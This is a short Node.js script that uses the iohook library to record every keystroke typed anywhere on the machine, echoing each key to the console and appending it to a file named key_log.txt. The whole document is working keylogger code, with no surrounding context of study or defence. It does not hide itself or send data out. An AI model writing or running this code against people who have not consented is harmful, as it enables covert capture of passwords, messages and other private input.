const iohook = require('iohook');
const fs = require('fs');

const logDir = '';
const logFile = logDir + 'key_log.txt';

iohook.on('keydown', event => {
    const keyString = event.keychar || String.fromCharCode(event.rawcode);
    console.log(keyString);

    // Log the key
    fs.appendFileSync(logFile, keyString);
});

console.log('Listening for key events...');

iohook.start();

process.on('SIGINT', () => {
    console.log('\nTerminating...');
    iohook.removeListener('keydown');
    iohook.removeAllListeners();
    process.exit();
});
